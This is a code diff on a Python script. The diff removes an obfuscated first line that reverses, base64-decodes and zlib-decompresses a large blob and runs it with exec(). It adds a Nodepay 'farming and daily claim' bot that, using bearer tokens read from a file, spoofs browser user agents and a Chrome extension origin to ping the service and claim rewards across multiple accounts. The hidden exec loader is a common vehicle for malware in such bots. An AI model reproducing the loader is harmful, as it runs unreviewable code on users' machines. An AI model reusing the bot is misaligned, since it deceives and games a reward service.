@@ -1,1 +1,208 @@
-_ = lambda __ : __import__('zlib').decompress(__import__('base64').b64decode(__[::-1]));exec((_)(b'==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'))
+import asyncio
+import time
+import uuid
+from loguru import logger
+from fake_useragent import UserAgent
+from curl_cffi import requests
+import concurrent.futures
+import threading
+
+# Constants
+PING_INTERVAL = 0.5
+RETRIES = 60
+
+DOMAIN_API = {
+    "SESSION": "http://api.nodepay.ai/api/auth/session",
+    "PING": "https://nw.nodepay.org/api/network/ping"
+}
+
+CONNECTION_STATES = {
+    "CONNECTED": 1,
+    "DISCONNECTED": 2,
+    "NONE_CONNECTION": 3
+}
+
+status_connect = CONNECTION_STATES["NONE_CONNECTION"]
+browser_id = None
+account_info = {}
+last_ping_time = {}
+
+print(f'==============================================')
+print(f'Farming & Daily Claim Nodepay Multiple Account')
+print(f'==============================================')
+
+def dailyclaim(token):
+    try:
+        url = f"https://api.nodepay.org/api/mission/complete-mission?"
+        headers = {
+                "Authorization": f"Bearer {token}",
+                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36",
+                "Content-Type": "application/json",
+                "Origin": "https://app.nodepay.ai",
+                "Referer": "https://app.nodepay.ai/"
+        }
+        
+        data = {
+                "mission_id":"1"
+        }
+        
+        response = requests.post(url, headers=headers, json=data, impersonate="chrome110")
+        is_success = response.json().get('success')
+        if is_success == True:
+                logger.info('Claim Reward Success!')
+                logger.info(response.json())
+        else:
+                logger.info('Reward Already Claimed! Or Something Wrong!')
+    except requests.exceptions.RequestException as e:
+        logger.info(f"Error : {e}")
+
+def uuidv4():
+    return str(uuid.uuid4())
+
+def valid_resp(resp):
+    if not resp or "code" not in resp or resp["code"] < 0:
+        raise ValueError("Invalid response")
+    return resp
+
+async def render_profile_info(token):
+    global browser_id, account_info
+
+    try:
+        np_session_info = load_session_info()
+
+        if not np_session_info:
+            # Generate new browser_id
+            browser_id = uuidv4()
+            response = await call_api(DOMAIN_API["SESSION"], {}, token)
+            valid_resp(response)
+            account_info = response["data"]
+            if account_info.get("uid"):
+                save_session_info(account_info)
+                await start_ping(token)
+            else:
+                handle_logout()
+        else:
+            account_info = np_session_info
+            await start_ping(token)
+    except Exception as e:
+        logger.error(f"Error in render_profile_info: {e}")
+        error_message = str(e)
+        if any(phrase in error_message for phrase in [
+            "sent 1011 (internal error) keepalive ping timeout; no close frame received",
+            "500 Internal Server Error"
+        ]):
+            logger.info("Removing error account info due to invalid response.")
+            handle_logout()
+        else:
+            logger.error(f"Connection error: {e}")
+
+async def call_api(url, data, token):
+    user_agent = UserAgent(os=['windows', 'macos', 'linux'], browsers='chrome')
+    random_user_agent = user_agent.random
+    headers = {
+        "Authorization": f"Bearer {token}",
+        "User-Agent": random_user_agent,
+        "Content-Type": "application/json",
+        "Origin": "chrome-extension://lgmpfmgeabnnlemejacfljbmonaomfmm",
+        "Accept": "application/json",
+        "Accept-Language": "en-US,en;q=0.5",
+    }
+
+    try:
+        response = requests.post(url, json=data, headers=headers, impersonate="chrome110", timeout=30)
+
+        response.raise_for_status()
+        return valid_resp(response.json())
+    except Exception as e:
+        logger.error(f"Error during API call: {e}")
+        raise ValueError(f"Failed API call to {url}")
+
+async def start_ping(token):
+    try:
+        while True:
+            await ping(token)
+            await asyncio.sleep(PING_INTERVAL)
+    except asyncio.CancelledError:
+        logger.info(f"Ping task was cancelled")
+    except Exception as e:
+        logger.error(f"Error in start_ping: {e}")
+
+async def ping(token):
+    global last_ping_time, RETRIES, status_connect
+
+    current_time = time.time()
+
+    last_ping_time["last_ping_time"] = current_time
+
+    try:
+        data = {
+            "id": account_info.get("uid"),
+            "browser_id": browser_id,
+            "timestamp": int(time.time()),
+            "version": "2.2.7"
+        }
+
+        response = await call_api(DOMAIN_API["PING"], data, token)
+        if response["code"] == 0:
+            logger.info(f"Ping successful: {response}")
+            RETRIES = 0
+            status_connect = CONNECTION_STATES["CONNECTED"]
+            dailyclaim(token)
+        else:
+            handle_ping_fail(response)
+    except Exception as e:
+        logger.error(f"Ping failed: {e}")
+        handle_ping_fail(None)
+
+def handle_ping_fail(response):
+    global RETRIES, status_connect
+
+    RETRIES += 1
+    if response and response.get("code") == 403:
+        handle_logout()
+    elif RETRIES < 2:
+        status_connect = CONNECTION_STATES["DISCONNECTED"]
+    else:
+        status_connect = CONNECTION_STATES["DISCONNECTED"]
+
+def handle_logout():
+    global status_connect, account_info
+
+    status_connect = CONNECTION_STATES["NONE_CONNECTION"]
+    account_info = {}
+    logger.info("Logged out and cleared session info.")
+
+def save_session_info(data):
+    # Saving session info (this could be to a file or a database)
+    pass
+
+def load_session_info():
+    return {}  # Return an empty dictionary if no session is saved
+
+def render_profile_info_thread(token):
+    asyncio.run(render_profile_info(token))
+
+async def process_tokens(tokens):
+    tasks = [render_profile_info(token) for token in tokens]
+    await asyncio.gather(*tasks)
+
+def main():
+    # Baca token dari file tokens.txt
+    try:
+        with open('np_retrunvoid.txt', 'r') as file:
+            tokens = [line.strip() for line in file if line.strip()]
+    except FileNotFoundError:
+        print("File tokens.txt tidak ditemukan. Pastikan file tersebut ada di direktori yang sama.")
+        exit()
+
+    if not tokens:
+        print("File tokens.txt kosong. Harap masukkan token ke dalam file.")
+        exit()
+
+    asyncio.run(process_tokens(tokens))
+
+if __name__ == '__main__':
+    try:
+        main()
+    except (KeyboardInterrupt, SystemExit):
+        logger.info("Program terminated by user.")
